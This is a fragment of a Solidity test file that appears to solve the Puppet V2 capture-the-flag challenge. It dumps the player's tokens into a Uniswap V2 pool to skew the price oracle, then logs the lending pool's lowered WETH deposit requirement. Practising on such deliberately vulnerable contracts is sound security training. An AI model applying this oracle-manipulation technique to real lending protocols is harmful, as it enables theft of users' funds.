...
contract PuppetV2Challenge is Test {
    ...
    function test_puppetV2() public checkSolvedByPlayer {
        console.log('[+] player initial eth values :');
        console.log(player.balance);
        console.log('[+] first required weth amount :');
        ...
        uniswapV2Router.swapExactTokensForETH(PLAYER_INITIAL_TOKEN_BALANCE,1 ether, path,player,block.timestamp+300);
        console.log('[+] player after eth values :');
        console.log(player.balance);
        console.log('[+] after uniswap, required weth amount :');
        console.log(lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE));
